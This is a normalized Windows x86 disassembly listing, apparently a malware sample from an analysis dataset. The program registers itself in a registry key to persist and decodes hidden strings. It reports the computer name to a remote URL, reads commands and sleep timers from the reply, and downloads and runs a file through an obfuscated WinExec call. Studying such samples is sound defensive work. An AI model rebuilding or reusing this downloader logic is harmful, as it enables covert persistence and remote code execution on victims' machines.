sub_401000
sub esp 0x210
mov dl [ rw-data ]
push ebp
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x115 ]
mov [ esp + 0x114 ] dl
mov [ esp + 0x10 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x11 ]
mov ebp [ strrchr@IAT ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x21c ]
push 0x2f
push edi
mov [ esp + 0x10 ] 0x57
mov [ esp + 0x11 ] 0x69
mov [ esp + 0x12 ] 0x6e
mov [ esp + 0x13 ] 0x45
mov [ esp + 0x14 ] 0x78
mov [ esp + 0x15 ] 0x65
mov [ esp + 0x16 ] 0x63
mov [ esp + 0x17 ] 0x0
call ebp
add esp 0x8
test eax eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push esi
lea edx [ esp + 0x118 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x228 ]
and ecx 0x3
test eax eax
[ edi ] [ esi ]
je r-xdata
pop edi
pop ebp
add esp 0x210
retn
mov edi [ esp + 0x224 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov esi [ esp + 0x224 ]
push 0x2e
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x224 ]
test eax eax
je r-xdata
pop edi
pop ebp
add esp 0x210
retn
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
push 0x2e
push esi
call ebp
add esp 0x8
sub eax esi
jmp r-xdata
pop edi
mov eax 0x1
pop ebp
add esp 0x210
retn
push rw-data
call [ LoadLibraryA@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
call eax
cmp eax 0x1f
ja r-xdata
mov [ esp + ecx + 0x14 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
jmp r-xdata
mov ecx eax
lea edi [ esp + 0x14 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx eax
xor ecx ecx
test eax eax
jle r-xdata
pop edi
xor eax eax
pop ebp
add esp 0x210
retn
and ecx 0x3
lea edx [ esp + 0x118 ]
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
call sub_4011d0
add esp 0x8
test eax eax
pop esi
jne r-xdata
sub_4011d0
sub esp 0x104
lea eax [ esp ]
push esi
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x8
lea ecx [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ InternetOpenA@IAT ]
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
add esp 0x104
retn
mov edx [ esp + 0x110 ]
mov eax [ esp + 0x10c ]
push edi
push edx
push eax
push esi
call sub_401240
add esp 0xc
mov edi eax
push esi
call [ InternetCloseHandle@IAT ]
mov eax edi
pop edi
pop esi
add esp 0x104
retn
sub_401240
mov eax 0x1000c
call sub_401bc0
mov eax [ esp + 0x10014 ]
mov ecx [ esp + 0x10010 ]
push ebx
push ebp
push esi
push edi
push 0x0
push 0x80000000
push 0x0
push 0x0
push eax
push ecx
call [ InternetOpenUrlA@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea edx [ esp + 0x14 ]
push 0x0
lea eax [ esp + 0x1c ]
push edx
push eax
push 0x20000005
push edi
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x28 ] 0x4
call [ HttpQueryInfoA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1000c
retn
mov ecx [ esp + 0x10028 ]
push rw-data
push ecx
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1000c
retn
mov ebp [ InternetReadFile@IAT ]
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x20 ]
push 0x4000
push eax
push edi
call ebp
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1000c
retn
push esi
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1000c
retn
mov ebx [ fflush@IAT ]
call ebx
push esi
call [ fclose@IAT ]
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1000c
retn
push eax
lea ecx [ esp + 0x24 ]
push 0x1
push ecx
call [ fwrite@IAT ]
push esi
call ebx
add esp 0x14
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x1c ]
push edx
push 0x4000
push eax
push edi
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
push esi
test eax eax
je r-xdata
sub_401370
sub esp 0x82c
push ebx
push ebp
mov ebp [ GetModuleFileNameA@IAT ]
push esi
push edi
lea eax [ esp + 0x224 ]
push 0x104
push eax
push 0x0
call ebp
lea edi [ esp + 0x224 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x120 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x42c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x634 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x42c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
push 0xf003f
push 0x0
push edx
push 0x80000001
call [ RegOpenKeyExA@IAT ]
lea edi [ esp + 0x120 ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
not ecx
lea eax [ esp + 0x120 ]
push ecx
push eax
push 0x1
lea ecx [ esp + 0x640 ]
push 0x0
push ecx
push edx
call [ RegSetValueExA@IAT ]
mov esi [ RegCloseKey@IAT ]
mov eax [ esp + 0x18 ]
push eax
call esi
push 0x80000001
call esi
push 0x220
call [ malloc@IAT ]
mov ebx eax
mov ecx 0x88
xor eax eax
mov edi ebx
add esp 0x4
[ edi ]
lea ecx [ esp + 0x328 ]
push 0x104
push ecx
push eax
call ebp
lea edx [ esp + 0x328 ]
push edx
call [ LoadLibraryA@IAT ]
lea ecx [ esp + 0x530 ]
push 0x104
push ecx
push 0x1
push eax
call [ LoadStringA@IAT ]
lea edx [ esp + 0x738 ]
lea eax [ esp + 0x530 ]
push edx
push eax
call sub_401a80
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebx + 0xa ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
xor eax eax
[ edi ] [ esi ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] eax
push rw-data
call [ OutputDebugStringA@IAT ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] edi
inc eax
cmp eax 0x3
mov [ esp + 0x14 ] eax
jl r-xdata
sub eax 0x2
je r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push 0x36ee80
call [ Sleep@IAT ]
jmp r-xdata
push rw-data
call [ OutputDebugStringA@IAT ]
lea ecx [ ebx + 0x118 ]
push ecx
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] edi
call [ atoi@IAT ]
lea eax [ eax + eax * 2 ]
add esp 0x4
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x5
push edx
call [ Sleep@IAT ]
jmp r-xdata
dec eax
jne r-xdata
lea ecx [ esp + 0x738 ]
push ebx
push ecx
call sub_4016b0
xor edi edi
add esp 0x8
sub eax edi
je r-xdata
mov esi [ OutputDebugStringA@IAT ]
push rw-data
call esi
lea edx [ esp + 0x1c ]
push edx
push 0x104
mov [ esp + 0x1c ] edi
call [ GetTempPathA@IAT ]
lea eax [ esp + 0x1c ]
push eax
call esi
lea ebp [ ebx + 0x118 ]
push 0x2f
push ebp
call [ strrchr@IAT ]
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x24 ]
and ecx 0x3
push 0x1
push eax
push ebp
[ edi ] [ esi ]
call sub_401000
add esp 0x14
test eax eax
jne r-xdata
push 0x57e40
mov [ esp + 0x14 ] 0x0
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x10 ] eax
cmp eax 0x3
mov eax [ ebx + 0x21c ]
jl r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
push 0x75300
call [ Sleep@IAT ]
jmp r-xdata
push eax
call [ Sleep@IAT ]
jmp r-xdata
push eax
call [ Sleep@IAT ]
jmp r-xdata
sub_4016b0
mov eax 0x5660
call sub_401bc0
push ebx
push ebp
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x15c ]
mov [ esp + 0x1c ] 0x32
[ edi ]
mov ecx 0x41
lea edi [ esp + 0x24 ]
[ edi ]
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x128 ]
push eax
push ecx
call [ GetComputerNameA@IAT ]
lea edx [ esp + 0x56c ]
push 0x104
push edx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea eax [ esp + 0x56c ]
push eax
call [ LoadLibraryA@IAT ]
lea ecx [ esp + 0x260 ]
push 0x104
push ecx
push 0x2
push eax
call [ LoadStringA@IAT ]
lea edx [ esp + 0x364 ]
lea eax [ esp + 0x260 ]
push edx
push eax
call sub_401a80
lea ecx [ esp + 0x36c ]
lea edx [ esp + 0x130 ]
push ecx
push edx
lea eax [ esp + 0x478 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x18
lea ecx [ esp + 0x468 ]
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ InternetOpenA@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov edx [ esp + 0x5674 ]
push 0x0
push 0x80000000
push 0x0
push 0x0
push edx
push esi
call [ InternetOpenUrlA@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5660
retn
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x670 ]
push eax
push 0x5000
push ecx
push edi
mov [ esp + 0x28 ] 0x0
call [ InternetReadFile@IAT ]
test eax eax
push edi
mov edi [ InternetCloseHandle@IAT ]
jne r-xdata
push esi
call [ InternetCloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x5660
retn
call edi
push esi
call edi
mov ebx [ esp + 0x5678 ]
or ecx 0xffffffff
mov edi ebx
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ ebx + 0xa ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov eax [ esp + 0x18 ]
xor esi esi
not ecx
dec ecx
mov [ esp + 0x10 ] esi
sub eax ecx
mov [ esp + 0x20 ] ecx
mov ecx eax
sub ecx edx
mov [ esp + 0x14 ] ecx
js r-xdata
call edi
push esi
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x5660
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x5660
retn
mov ecx edx
mov edi ebx
lea esi [ esp + esi + 0x670 ]
xor ebp ebp
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x10 ]
add edx ecx
cmp edx 0xffffffff
mov [ esp + 0x14 ] edx
jne r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
inc esi
cmp esi ecx
mov [ esp + 0x10 ] esi
jle r-xdata
cmp edx eax
mov ebp edx
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x5660
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x5660
retn
mov ecx [ esp + 0x20 ]
lea edi [ ebx + 0xa ]
lea esi [ esp + ebp + 0x670 ]
xor edx edx
[ esi ] [ edi ]
je r-xdata
cmp ebp 0xffffffff
jne r-xdata
inc ebp
cmp ebp eax
jle r-xdata
mov eax [ esp + 0x14 ]
sub ebp eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x5660
retn
mov ecx ebp
lea esi [ esp + eax + 0x670 ]
mov eax ecx
lea edi [ esp + 0x15c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea edx [ esp + 0x15c ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x24 ]
push ecx
push edx
call sub_401a80
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x5660
retn
mov esi [ OutputDebugStringA@IAT ]
lea eax [ esp + 0x15c ]
push eax
call esi
lea ecx [ esp + 0x24 ]
push ecx
call esi
mov esi [ strchr@IAT ]
lea edx [ esp + 0x24 ]
push 0x3a
push edx
call esi
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5660
retn
lea eax [ esp + 0x24 ]
push 0x3a
push eax
call esi
mov edi [ strstr@IAT ]
mov esi eax
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x2c ]
sub esi ecx
push rw-data
push edx
mov [ esp + 0x20 ] esi
call edi
add esp 0x10
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5660
retn
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ ebx + 0x21c ] eax
mov ebp ecx
inc ebp
lea eax [ esp + 0x24 ]
push rw-data
push eax
call edi
mov ebp eax
lea ecx [ esp + 0x2c ]
sub ebp ecx
lea edx [ esp + ebp + 0x2e ]
push edx
call [ atoi@IAT ]
lea eax [ eax + eax * 2 ]
add esp 0xc
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
mov [ ebx + 0x21c ] eax
jmp r-xdata
mov [ eax + ebx + 0x14 ] 0x0
sub ebp esi
xor eax eax
dec ebp
test ebp ebp
jle r-xdata
mov ecx esi
lea edi [ ebx + 0x14 ]
mov edx ecx
lea esi [ esp + 0x24 ]
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi eax
xor eax eax
test esi esi
jle r-xdata
mov edi [ _stricmp@IAT ]
lea esi [ ebx + 0x14 ]
push rw-data
push esi
mov [ eax + ebx + 0x118 ] 0x0
call edi
add esp 0x8
test eax eax
jne r-xdata
mov ecx ebp
lea edi [ ebx + 0x118 ]
mov eax ecx
lea esi [ esp + esi + 0x25 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push rw-data
push esi
call edi
add esp 0x8
neg eax
sbb eax eax
pop edi
and al 0xfd
pop esi
pop ebp
add eax 0x3
pop ebx
add esp 0x5660
retn
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
add esp 0x5660
retn
sub_401a80
sub esp 0x88
push ebx
push ebp
push esi
push edi
mov ecx 0x16
mov esi rw-data
lea edi [ esp + 0x3c ]
mov edx [ esp + 0x9c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x6
mov esi rw-data
lea edi [ esp + 0x20 ]
xor eax eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ebp [ esp + 0xa0 ]
xor ebx ebx
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x3c ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x20 ]
mov [ esp + 0x14 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x1c ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
test ecx ecx
mov [ esp + 0x18 ] ecx
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x88
retn
mov esi ebp
mov ebp [ strchr@IAT ]
sub esi edx
mov edi edx
mov [ esp + 0x10 ] esi
movsx ecx al
lea edx [ esp + 0x3c ]
push ecx
push edx
call ebp
add esp 0x8
test eax eax
je r-xdata
mov [ esi + edi ] 0x20
jmp r-xdata
mov edx [ esp + 0xa0 ]
pop edi
pop esi
pop ebp
mov [ edx ] 0x0
xor eax eax
pop ebx
add esp 0x88
retn
movsx eax [ edi ]
lea ecx [ esp + 0x3c ]
push eax
push ecx
call ebp
mov esi eax
lea edx [ esp + 0x44 ]
mov eax ebx
sub esi edx
cdq
idiv [ esp + 0x24 ]
lea ecx [ esp + 0x44 ]
movsx eax [ esp + edx + 0x28 ]
push eax
push ecx
call ebp
lea edx [ esp + 0x4c ]
add esp 0x10
sub edx eax
add esi edx
jns r-xdata
inc ebx
inc edi
cmp ebx ecx
jl r-xdata
mov ecx [ esp + 0x10 ]
mov al [ esp + esi + 0x3c ]
mov esi [ esp + 0x10 ]
mov [ ecx + edi ] al
mov ecx [ esp + 0x18 ]
add esi [ esp + 0x14 ]
mov al [ edi ]
cmp al 0x25
jne r-xdata
sub_401bc0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401d6f
cmp [ rw-data ] ebx
jne r-xdata
call sub_401d5a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401d6c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401370
sub_401d41
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401d5a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401d6c
xor eax eax
retn
sub_401d6f
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
